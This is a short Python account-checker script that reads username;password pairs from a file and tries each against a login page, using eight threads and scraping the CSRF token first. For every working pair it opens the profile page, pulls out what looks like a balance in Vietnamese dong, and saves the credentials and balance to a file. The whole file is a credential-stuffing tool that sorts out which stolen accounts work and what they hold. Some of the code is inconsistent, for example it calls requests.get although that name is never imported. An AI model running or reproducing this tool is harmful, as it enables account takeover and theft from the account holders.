from re import search
import threading
from requests import get,post
import urllib3
from urllib.parse import quote_plus
urllib3.disable_warnings()
url="https://example.com/login"



class myThread (threading.Thread):
    def __init__(self, threadID, counter,port,mylist):
      threading.Thread.__init__(self)
      self.threadID = threadID
      self.counter = counter
      self.port=port
      self.mylist=mylist
    def run(self):
        self.print_time(self.threadID, self.counter,self.port,self.mylist)



    def print_time(self,ID, counter,port,mylist):
        while counter < len(mylist):
            check(mylist[counter]['user'],mylist[counter]['pwd'])
            counter+=port
            



def check(  user,  pwd):

    global url
    x = requests.get(url)
    token= search('"_token" value="(.*?)"',x.text)
    data={'_token':token.group(1),'username':user,'password': pwd}
    y = requests.post(url,data=data,cookies=x.cookies)
    z =requests.get('https://example.com/profile',cookies=y.cookies)
    fil=search('class="text-danger">(.*?)đ</b>',z.text)
    if fil==None:
        return False
    fil=fil.group(1)
    print(fil)
    with open('filter.txt','a',encoding="utf-8") as f:
        f.write("user : "+user +"; pass:"+pwd+"; "+fil+'\n')
    return False


def start(listFileFound,port):
    mylist=[]
    with open(listFileFound,'r', encoding="utf-8") as fh:
        lines=fh.readlines()
    for line in lines:
        arr=line.strip().replace(" ","").split(";")
        mylist.append({'user':arr[0],'pwd':arr[1]})
    for i in range(port) :
        myThread(int(i)+1,int(i) ,port,mylist).start()

    

start('n_found.txt',8)
